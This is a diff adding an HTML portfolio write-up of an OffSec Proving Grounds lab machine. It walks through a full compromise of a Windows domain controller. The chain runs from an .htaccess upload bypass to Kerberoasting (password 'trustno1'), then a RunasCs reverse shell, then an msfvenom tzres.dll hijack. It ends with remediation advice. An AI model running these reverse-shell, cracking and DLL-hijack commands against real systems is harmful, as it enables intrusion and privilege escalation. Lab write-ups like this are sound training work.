@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>OffSec PG | Access | Report</title>
+
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- FontAwesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            'cyber-black': '#0b1020',
+            'cyber-gray': '#0f1733',
+            'cyber-green': '#5eead4',
+            'cyber-green-dim': 'rgba(94, 234, 212, 0.1)',
+            'cyber-purple': '#a78bfa',
+            'cyber-red': '#ff003c',
+          },
+          fontFamily: {
+            mono: ['"Fira Code"', 'monospace'],
+            tech: ['"Share Tech Mono"', 'monospace'],
+          },
+          boxShadow: {
+            'neon': '0 0 10px rgba(94, 234, 212, 0.5), 0 0 20px rgba(94, 234, 212, 0.3)',
+          }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    ::-webkit-scrollbar { width: 8px; }
+    ::-webkit-scrollbar-track { background: #0b1020; }
+    ::-webkit-scrollbar-thumb { background: #23305f; border-radius: 4px; }
+    ::-webkit-scrollbar-thumb:hover { background: #5eead4; }
+    .bg-grid {
+      background-size: 40px 40px;
+      background-image: linear-gradient(to right, rgba(94, 234, 212, 0.05) 1px, transparent 1px),
+                        linear-gradient(to bottom, rgba(167, 139, 250, 0.05) 1px, transparent 1px);
+    }
+    .terminal {
+      background: rgba(0,0,0,0.35);
+      border: 1px solid #23305f;
+      border-radius: 12px;
+      padding: 14px;
+      overflow-x: auto;
+      box-shadow: 0 0 0 rgba(0,0,0,0);
+    }
+    .terminal pre {
+      margin: 0;
+      white-space: pre;
+      font-size: 0.9rem;
+      line-height: 1.35rem;
+      color: #d1d5db;
+    }
+    .kbd {
+      border: 1px solid #23305f;
+      background: rgba(26,35,66,0.8);
+      padding: 2px 8px;
+      border-radius: 10px;
+      font-size: 0.8rem;
+      color: #e5e7eb;
+    }
+    /* Image modal */
+    #imgModal { display: none; }
+    #imgModal.active { display: flex; }
+  </style>
+</head>
+
+<body class="bg-cyber-black text-gray-300 font-mono relative overflow-x-hidden min-h-screen flex flex-col">
+
+  <!-- Background Overlay -->
+  <div class="fixed inset-0 bg-grid pointer-events-none z-0"></div>
+
+  <!-- Navbar -->
+  <nav class="fixed w-full z-50 bg-cyber-black/90 backdrop-blur-md border-b border-[#23305f]">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="flex items-center justify-between h-16">
+        <div class="flex-shrink-0">
+          <a href="reports.html" class="text-2xl font-bold text-cyber-green font-tech tracking-wider">&lt;josh/&gt;</a>
+        </div>
+        <div class="flex items-center gap-3">
+          <a href="reports.html" class="flex items-center text-gray-300 hover:text-white transition-colors">
+            <i class="fas fa-arrow-left mr-2"></i> Back to Reports
+          </a>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Main Content -->
+  <main class="relative z-10 pt-28 pb-20 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex-grow">
+
+    <!-- Header -->
+    <div class="text-center mb-10">
+      <h1 class="text-4xl md:text-5xl font-bold text-white mb-3">
+        <span class="text-cyber-green">./</span> OffSec Proving Grounds — <span class="text-cyber-green">Access</span>
+      </h1>
+      <p class="text-gray-400 max-w-3xl mx-auto">
+        End-to-end attack chain: <span class="kbd">File Upload</span> → <span class="kbd">Kerberoasting</span> → <span class="kbd">RunasCs</span> → <span class="kbd">SeManageVolumePrivilege</span> → <span class="kbd">DLL Hijacking</span> → <span class="kbd">Admin shell</span>
+      </p>
+      <div class="mt-4 flex flex-wrap justify-center gap-2">
+        <span class="text-xs bg-green-900/30 text-green-300 border border-green-900 px-2 py-1 rounded whitespace-nowrap">CTF / Lab</span>
+        <span class="text-xs bg-purple-900/30 text-purple-300 border border-purple-900 px-2 py-1 rounded whitespace-nowrap">Windows + AD</span>
+        <span class="text-xs text-gray-500 px-2 py-1 rounded whitespace-nowrap border border-[#23305f]">Sanitized</span>
+      </div>
+    </div>
+
+    <!-- Executive Summary -->
+    <section class="bg-cyber-gray border border-[#23305f] rounded-lg p-6 mb-6">
+      <div class="flex items-start gap-4">
+        <div class="text-cyber-green text-2xl mt-1"><i class="fas fa-bullseye"></i></div>
+        <div class="w-full">
+          <h2 class="text-2xl font-bold text-white mb-2">Executive Summary</h2>
+          <p class="text-gray-300 leading-relaxed">
+            The target exposed an insecure file upload workflow that allowed uploading an <span class="text-cyber-green">.htaccess</span> file and running PHP code via a custom extension. This resulted in a reverse shell as
+            <span class="text-cyber-green">svc_apache</span>. From that foothold, Kerberoasting was used to obtain a crackable TGS for <span class="text-cyber-green">svc_mssql</span>, leading to credential recovery.
+            Using <span class="text-cyber-green">RunasCs</span>, a reverse shell was established under <span class="text-cyber-green">svc_mssql</span>.
+            Finally, the presence of <span class="text-cyber-green">SeManageVolumePrivilege</span> enabled writing into a protected directory and performing a DLL hijack by placing a malicious <span class="text-cyber-green">tzres.dll</span>
+            into <span class="text-cyber-green">C:\Windows\System32\wbem\</span>. Triggering <span class="text-cyber-green">systeminfo</span> loaded the DLL and delivered an elevated reverse shell.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Findings at a glance -->
+    <section class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+      <div class="bg-cyber-gray border border-[#23305f] rounded-lg p-6">
+        <h3 class="text-xl font-bold text-white mb-3"><i class="fas fa-triangle-exclamation text-cyber-red mr-2"></i>Key Issues</h3>
+        <ul class="space-y-2 text-gray-300">
+          <li>• File upload filter bypass via <span class="text-cyber-green">.htaccess</span> → PHP execution</li>
+          <li>• Kerberoastable service account: <span class="text-cyber-green">svc_mssql</span> (RC4 TGS)</li>
+          <li>• Privileged file write path (via <span class="text-cyber-green">SeManageVolumePrivilege</span>)</li>
+          <li>• DLL hijacking opportunity: missing <span class="text-cyber-green">tzres.dll</span> under <span class="text-cyber-green">wbem</span></li>
+        </ul>
+      </div>
+      <div class="bg-cyber-gray border border-[#23305f] rounded-lg p-6">
+        <h3 class="text-xl font-bold text-white mb-3"><i class="fas fa-route text-cyber-green mr-2"></i>Attack Path</h3>
+        <ol class="space-y-2 text-gray-300 list-decimal list-inside">
+          <li>Enumerate services (Nmap)</li>
+          <li>Abuse upload feature to execute PHP via <span class="text-cyber-green">.dork</span></li>
+          <li>Reverse shell as <span class="text-cyber-green">svc_apache</span></li>
+          <li>Identify SPN and perform Kerberoasting</li>
+          <li>Crack TGS → recover <span class="text-cyber-green">svc_mssql</span> password</li>
+          <li>Use <span class="text-cyber-green">RunasCs</span> → reverse shell as <span class="text-cyber-green">svc_mssql</span></li>
+          <li>Run <span class="text-cyber-green">SeManageVolumeExploit</span> binary</li>
+          <li>Place malicious <span class="text-cyber-green">tzres.dll</span> and trigger <span class="text-cyber-green">systeminfo</span> → elevated shell</li>
+        </ol>
+      </div>
+    </section>
+
+    <!-- Recon -->
+    <section class="bg-cyber-gray border border-[#23305f] rounded-lg p-6 mb-6">
+      <h2 class="text-2xl font-bold text-white mb-4"><i class="fas fa-satellite-dish text-cyber-green mr-2"></i>Recon & Service Discovery</h2>
+      <p class="text-gray-300 mb-4">
+        Full TCP scan identified the host as a Windows domain controller running Apache/PHP and Kerberos/LDAP services.
+      </p>
+      <div class="terminal">
+<pre># Nmap (sanitized)
+PORT      STATE  SERVICE       VERSION
+53/tcp    open   domain        Simple DNS Plus
+80/tcp    open   http          Apache httpd 2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+88/tcp    open   kerberos-sec  Microsoft Windows Kerberos
+135/tcp   open   msrpc         Microsoft Windows RPC
+139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
+443/tcp   open   ssl/http      Apache httpd 2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+445/tcp   open   microsoft-ds
+3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (access.offsec)
+5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0
+9389/tcp  open   mc-nmf        .NET Message Framing
+47001/tcp open   http          Microsoft HTTPAPI httpd 2.0</pre>
+      </div>
+    </section>
+
+    <!-- Web Exploitation -->
+    <section class="bg-cyber-gray border border-[#23305f] rounded-lg p-6 mb-6">
+      <h2 class="text-2xl font-bold text-white mb-4"><i class="fas fa-globe text-cyber-green mr-2"></i>Initial Access — File Upload to RCE</h2>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+        <div>
+          <p class="text-gray-300 mb-3">
+            The web application exposed a ticket purchase workflow with an image upload feature. File type validation could be bypassed by uploading an
+            <span class="text-cyber-green">.htaccess</span> file and mapping a custom extension to PHP execution.
+          </p>
+
+          <div class="terminal mb-4">
+<pre># .htaccess used for extension-to-PHP mapping
+AddType application/x-httpd-php .dork</pre>
+          </div>
+
+          <p class="text-gray-300 mb-3">
+            A PHP reverse shell (custom extension <span class="text-cyber-green">.dork</span>) was uploaded and executed from the discovered upload directory.
+          </p>
+
+          <div class="terminal">
+<pre># Fuzzing to discover upload directory
+200   777B   http://TARGET/uploads/
+301   344B   http://TARGET/uploads    -> /uploads/
+403   304B   http://TARGET/web.config::$DATA
+403   423B   http://TARGET/webalizer/</pre>
+          </div>
+        </div>
+
+        <div class="space-y-4">
+          <figure class="border border-[#23305f] rounded-lg overflow-hidden">
+            <img src="images/file_upload_vuln.png" alt="File upload form" class="w-full cursor-zoom-in js-zoom" data-caption="File upload form (ticket purchase workflow)">
+            <figcaption class="text-xs text-gray-400 p-3">File upload form (click to zoom)</figcaption>
+          </figure>
+
+          <figure class="border border-[#23305f] rounded-lg overflow-hidden">
+            <img src="images/htaccess_file.png" alt=".htaccess content" class="w-full cursor-zoom-in js-zoom" data-caption=".htaccess used to map .dork to PHP">
+            <figcaption class="text-xs text-gray-400 p-3">.htaccess mapping (click to zoom)</figcaption>
+          </figure>
+
+          <figure class="border border-[#23305f] rounded-lg overflow-hidden">
+            <img src="images/fuzzing_page.png" alt="Fuzzing results" class="w-full cursor-zoom-in js-zoom" data-caption="Fuzzing results revealing /uploads/">
+            <figcaption class="text-xs text-gray-400 p-3">Upload directory discovery (click to zoom)</figcaption>
+          </figure>
+        </div>
+      </div>
+    </section>
+
+    <!-- Kerberoasting -->
+    <section class="bg-cyber-gray border border-[#23305f] rounded-lg p-6 mb-6">
+      <h2 class="text-2xl font-bold text-white mb-4"><i class="fas fa-key text-cyber-green mr-2"></i>Privilege Escalation — Kerberoasting to svc_mssql</h2>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+        <div>
+          <p class="text-gray-300 mb-3">
+            After obtaining a foothold as <span class="text-cyber-green">svc_apache</span>, Service Principal Names (SPNs) were enumerated to identify Kerberoastable accounts.
+          </p>
+
+          <div class="terminal mb-4">
+<pre>PS C:\xampp\htdocs&gt; setspn -T ACCESS -Q */*
+...
+CN=MSSQL,CN=Users,DC=access,DC=offsec
+        MSSQLSvc/DC.access.offsec
+
+Existing SPN found!</pre>
+          </div>
+
+          <p class="text-gray-300 mb-3">
+            <span class="text-cyber-green">Rubeus</span> was uploaded and used to request a TGS for <span class="text-cyber-green">svc_mssql</span> (RC4_HMAC). The resulting hash was cracked offline with Hashcat (mode <span class="text-cyber-green">13100</span>),
+            recovering the password: <span class="text-cyber-green font-bold">trustno1</span>.
+          </p>
+
+          <div class="terminal">
+<pre># Hashcat
+hashcat -m 13100 -a 0 mssql.hash rockyou.txt
+# Result
+svc_mssql : trustno1</pre>
+          </div>
+        </div>
+
+        <div class="space-y-4">
+          <figure class="border border-[#23305f] rounded-lg overflow-hidden">
+            <img src="images/existing_SPNs.png" alt="SPN enumeration" class="w-full cursor-zoom-in js-zoom" data-caption="SPN enumeration (setspn)">
+            <figcaption class="text-xs text-gray-400 p-3">SPN enumeration (click to zoom)</figcaption>
+          </figure>
+
+          <figure class="border border-[#23305f] rounded-lg overflow-hidden">
+            <img src="images/upload_rubeus.png" alt="Uploading Rubeus" class="w-full cursor-zoom-in js-zoom" data-caption="Uploading and staging Rubeus">
+            <figcaption class="text-xs text-gray-400 p-3">Uploading Rubeus (click to zoom)</figcaption>
+          </figure>
+
+          <figure class="border border-[#23305f] rounded-lg overflow-hidden">
+            <img src="images/hash_decode.png" alt="Kerberoast hash" class="w-full cursor-zoom-in js-zoom" data-caption="Kerberoast hash + cracking context">
+            <figcaption class="text-xs text-gray-400 p-3">Kerberoast hash & cracking (click to zoom)</figcaption>
+          </figure>
+        </div>
+      </div>
+    </section>
+
+    <!-- RunasCs -->
+    <section class="bg-cyber-gray border border-[#23305f] rounded-lg p-6 mb-6">
+      <h2 class="text-2xl font-bold text-white mb-4"><i class="fas fa-terminal text-cyber-green mr-2"></i>Lateral Move — Shell as svc_mssql (RunasCs)</h2>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+        <div>
+          <p class="text-gray-300 mb-3">
+            Standard interactive techniques were constrained (no stable TTY). Using <span class="text-cyber-green">RunasCs</span>, a reverse shell was spawned under
+            <span class="text-cyber-green">svc_mssql</span> using the recovered credentials.
+          </p>
+
+          <div class="terminal mb-4">
+<pre># Listener
+nc -nvlp 4444
+
+# RunasCs (svc_mssql)
+.\RunasCs.exe svc_mssql trustno1 "cmd.exe" -r 192.168.45.184:4444</pre>
+          </div>
+
+          <div class="terminal">
+<pre>C:\Windows\system32&gt; whoami /priv
+
+Privilege Name                State
+----------------------------  --------
+SeManageVolumePrivilege       Disabled</pre>
+          </div>
+        </div>
+
+        <div class="space-y-4">
+          <figure class="border border-[#23305f] rounded-lg overflow-hidden">
+            <img src="images/RunasCs_svc_mssql.png" alt="RunasCs execution" class="w-full cursor-zoom-in js-zoom" data-caption="RunasCs spawning cmd.exe as svc_mssql">
+            <figcaption class="text-xs text-gray-400 p-3">RunasCs (click to zoom)</figcaption>
+          </figure>
+        </div>
+      </div>
+
+      <div class="mt-5 border-t border-[#23305f] pt-5">
+        <h3 class="text-lg font-bold text-white mb-2">Referenced Tools</h3>
+        <ul class="text-gray-300 space-y-2">
+          <li>• RunasCs: <span class="text-cyber-green">https://github.com/antonioCoco/RunasCs</span></li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- SeManageVolume + DLL Hijack -->
+    <section class="bg-cyber-gray border border-[#23305f] rounded-lg p-6 mb-6">
+      <h2 class="text-2xl font-bold text-white mb-4"><i class="fas fa-shield-halved text-cyber-green mr-2"></i>Elevation — SeManageVolume + DLL Hijack (tzres.dll)</h2>
+
+      <p class="text-gray-300 mb-4">
+        With <span class="text-cyber-green">SeManageVolumePrivilege</span> present, a known abuse path was used to enable protected directory file placement.
+        Prior to the DLL hijack stage, the binary <span class="text-cyber-green">SeManageVolumeExploit.exe</span> was executed to facilitate writing into
+        <span class="text-cyber-green">C:\Windows\System32\wbem\</span>. The target analysis indicated that <span class="text-cyber-green">systeminfo</span> would attempt to load
+        <span class="text-cyber-green">tzres.dll</span> from that directory if missing, enabling DLL hijacking.
+      </p>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+        <div>
+          <h3 class="text-lg font-bold text-white mb-2">DLL Payload Creation</h3>
+          <div class="terminal mb-4">
+<pre># Generate tzres.dll reverse shell payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.184 LPORT=5555 -f dll -o tzres.dll</pre>
+          </div>
+
+          <h3 class="text-lg font-bold text-white mb-2">Trigger</h3>
+          <div class="terminal">
+<pre># Listener
+nc -nvlp 5555
+
+# Trigger DLL load
+systeminfo</pre>
+          </div>
+        </div>
+
+        <div>
+          <h3 class="text-lg font-bold text-white mb-2">Outcome</h3>
+          <p class="text-gray-300 mb-3">
+            After placing <span class="text-cyber-green">tzres.dll</span> into <span class="text-cyber-green">wbem</span> and triggering <span class="text-cyber-green">systeminfo</span>,
+            the service loaded the malicious DLL, resulting in an elevated reverse shell (administrator-level), completing the compromise chain.
+          </p>
+
+          <div class="bg-black/30 border border-[#23305f] rounded-lg p-4 text-sm text-gray-300">
+            <div class="flex items-center gap-2 mb-2">
+              <i class="fas fa-check-circle text-cyber-green"></i>
+              <span class="font-bold text-white">Validation</span>
+            </div>
+            <ul class="space-y-1">
+              <li>• Confirm elevated identity via <span class="text-cyber-green">whoami</span></li>
+              <li>• Confirm administrative token / group membership as appropriate</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <div class="mt-5 border-t border-[#23305f] pt-5">
+        <h3 class="text-lg font-bold text-white mb-2">Referenced Tools</h3>
+        <ul class="text-gray-300 space-y-2 break-words">
+          <li>• SeManageVolumeAbuse: <span class="text-cyber-green">https://github.com/xct/SeManageVolumeAbuse</span></li>
+          <li>• SeManageVolumeExploit (release): <span class="text-cyber-green">https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public</span></li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- Recommendations -->
+    <section class="bg-cyber-gray border border-[#23305f] rounded-lg p-6 mb-6">
+      <h2 class="text-2xl font-bold text-white mb-4"><i class="fas fa-wrench text-cyber-green mr-2"></i>Recommendations</h2>
+      <ul class="space-y-2 text-gray-300">
+        <li>• Enforce strict server-side upload validation; block <span class="text-cyber-green">.htaccess</span> uploads and disable per-directory overrides where possible.</li>
+        <li>• Restrict execution in upload directories; enforce non-executable storage locations and validate MIME types server-side.</li>
+        <li>• Reduce Kerberoasting risk: use AES-only where possible, rotate service passwords, and enforce strong random service account passwords.</li>
+        <li>• Minimize privileged rights: avoid granting <span class="text-cyber-green">SeManageVolumePrivilege</span> to non-admin service accounts unless required.</li>
+        <li>• Harden DLL loading: use absolute paths, <span class="text-cyber-green">SetDefaultDllDirectories</span>, and remove unsafe search paths; review application directories for weak ACLs.</li>
+      </ul>
+    </section>
+
+    <!-- Footer note -->
+    <div class="text-center text-gray-500 text-sm mt-10">
+      <p>© 2026 Josh Chalabi — Report generated for portfolio documentation.</p>
+    </div>
+
+  </main>
+
+  <!-- Image Modal -->
+  <div id="imgModal" class="fixed inset-0 z-[999] items-center justify-center bg-black/80 p-4">
+    <div class="max-w-6xl w-full">
+      <div class="flex items-center justify-between mb-3">
+        <div id="imgCaption" class="text-gray-200 text-sm"></div>
+        <button id="imgClose" class="text-gray-200 hover:text-white px-3 py-1 border border-[#23305f] rounded">
+          <i class="fas fa-xmark mr-2"></i>Close
+        </button>
+      </div>
+      <img id="imgFull" src="" alt="Zoomed image" class="w-full rounded-lg border border-[#23305f] shadow-neon">
+    </div>
+  </div>
+
+  <script>
+    const modal = document.getElementById('imgModal');
+    const imgFull = document.getElementById('imgFull');
+    const imgCaption = document.getElementById('imgCaption');
+    const closeBtn = document.getElementById('imgClose');
+
+    function closeModal() {
+      modal.classList.remove('active');
+      imgFull.src = '';
+      imgCaption.textContent = '';
+    }
+
+    document.querySelectorAll('.js-zoom').forEach(img => {
+      img.addEventListener('click', () => {
+        imgFull.src = img.getAttribute('src');
+        imgCaption.textContent = img.getAttribute('data-caption') || '';
+        modal.classList.add('active');
+      });
+    });
+
+    closeBtn.addEventListener('click', closeModal);
+    modal.addEventListener('click', (e) => {
+      if (e.target === modal) closeModal();
+    });
+
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape') closeModal();
+    });
+  </script>
+
+</body>
+</html>
